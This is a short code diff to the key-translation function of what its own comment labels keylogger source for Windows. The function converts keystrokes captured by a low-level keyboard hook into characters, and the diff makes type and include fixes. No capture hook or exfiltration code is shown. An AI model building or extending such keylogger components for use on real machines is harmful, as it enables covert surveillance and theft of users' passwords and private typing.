@@ -1,7 +1,7 @@
 #include <windows.h>
 #include "keyboard.h"
 #include "config.h"
-
+#include "logging.h"
 /* Get actual key description keylogger logic */
 // This function will translate a pressed key to its actual descrption.
 //	The function will consider the state of special keys such as Shift, Capslock, and will translate accordingly.
@@ -9,7 +9,7 @@
 //	in the relevant language.
 // VirtualKey Codes: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
 // Will return True if translation was made, otherwise false (for example in case of a single shift pressed)
-BOOL GetActualKeyDescription(__in KBDLLHOOKSTRUCT *keyboardStruct, __in DWORD dwKeyDescriptionSize, __out LPCSTR wcKeyDescription)
+BOOL GetActualKeyDescription(__in KBDLLHOOKSTRUCT *keyboardStruct, __in DWORD dwKeyDescriptionSize, __out LPCWSTR wcKeyDescription)
 {
 	WCHAR wcBufferTemp[BUFFER_SIZE] = { 0 };
 	DWORD lParamScanCodeWithFlags = 0;
@@ -56,7 +56,7 @@ BOOL GetActualKeyDescription(__in KBDLLHOOKSTRUCT *keyboardStruct, __in DWORD dw
 			// Get current keyboard state (the state of each key)
 			GetKeyboardState(bArrayKeyboardState);
 			// Convert letter to unicode, the result will be in 'wcKeyDescription'
-			ToUnicodeEx(keyboardStruct->vkCode, keyboardStruct->scanCode, (BYTE*)bArrayKeyboardState, wcKeyDescription, dwKeyDescriptionSize, NULL, GetKeyboardLayout(dwThreadId));
+			ToUnicodeEx(keyboardStruct->vkCode, keyboardStruct->scanCode, (BYTE*)bArrayKeyboardState, wcKeyDescription, dwKeyDescriptionSize, 0, GetKeyboardLayout(dwThreadId));
 		}
 		else
 		{
@@ -119,4 +119,3 @@ BOOL GetActualKeyDescription(__in KBDLLHOOKSTRUCT *keyboardStruct, __in DWORD dw
 }
 
 /*********************************/
-
